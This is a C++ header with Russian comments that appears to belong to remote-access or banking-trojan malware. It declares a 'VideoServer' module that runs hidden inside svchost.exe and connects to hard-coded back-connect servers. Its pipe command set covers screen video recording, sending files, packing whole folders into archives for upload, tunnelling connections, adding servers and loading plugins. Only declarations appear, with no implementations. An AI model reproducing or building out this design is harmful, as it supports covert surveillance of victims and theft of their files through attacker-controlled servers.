#pragma once

#include "core\core.h"
#include "core\pipe.h"
#include "core\ThroughTunnel.h"

namespace VideoServer
{

//добавляемые новые сервера
struct StruAddServers
{
	bool force; //подключение к 1-му указанному серверу
	int count; //количество адресов серверов
};

int Init();
void Release();

//запускает видео сервер в текущем процессе
void Run( bool async = true );
//запускает видео сервер в отдельном svchost.exe
bool RunInSvchost( const char* nameUser = 0 );
//стартует видео сервер в зависмости от настроек билдера
//сокеты должны быть инициализированы
void Start();
//проверяет есть ли связь с каким либо зашитым сервером
bool VerifyConnect();
//возвращает зашитые адреса бк серверов, разделенные '|'
bool GetHosts( StringBuilder& hosts );

}

//управление видео сервером через менеджер
class VideoPipeServer : public PipeServer
{
		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );
		virtual void Disconnect();

		void SendFile( const void* data, int c_data );

	public:

		enum
		{
			CmdVideo,		//запуск записи видео
			CmdVideoOff,	//отключение видео записи
			CmdSendFile,	//отправка файла
			CmdPackSendFolder, //пакует папку в cab файл и отсылает архив на сервер
			CmdCreateLog,	//создает поток для отправки логов
			CmdSendLog,		//отправка лога
			CmdTunnel,		//создает туннель для передачи соединения на сервер
			CmdAddServers,	//добавляет адреса новых видео серверов
			CmdSendStr,		//отсылает серверу строку в специальном виде
			CmdFirstFrame,	//отсылка начального кадра для онлайн видео
			CmdLoadPlugin,	//загрузка плагина
			CmdCreateStream, //создание потока для отправки данных 
			CmdSendStreamData, //отсылка данных в поток
			CmdCloseStream	//закрытие указанного потока
		};


		struct MsgVideo
		{
			char nameVideo[64];
			DWORD pid;
		};

		#pragma warning ( disable : 4200 )
		struct MsgSendFile
		{
			char typeName[64];
			char fileName[128];
			char ext[16];
			int c_data;
			byte data[0]; 
		};

		struct MsgSendFolderPack
		{
			char typeName[64];
			char fileName[128];
			char srcFolder[MAX_PATH]; //пакуемая папка
			char dstFolder[64]; //имя папки в архиве
			int globalId; //если >=0, то установить соответствующий глобальный флаг
		};

		VideoPipeServer();
		~VideoPipeServer();

		//регистрация видео сервера в менеджере
		bool Reg();
		//передает команду менеджеру, который отправит строку на сервер
		static bool SendStr( int id, int subId, const char* s, int c_s = -1 );
		static bool SendStr( int id, int subId, const StringBuilder& s )
		{
			return SendStr( id, subId, s.c_str(), s.Len() );
		}
};

class VideoServerTunnel : public ThroughTunnel 
{
	
	protected:

		virtual int Connected( int sc );

	public:

		VideoServerTunnel( int portIn );
		~VideoServerTunnel();
};

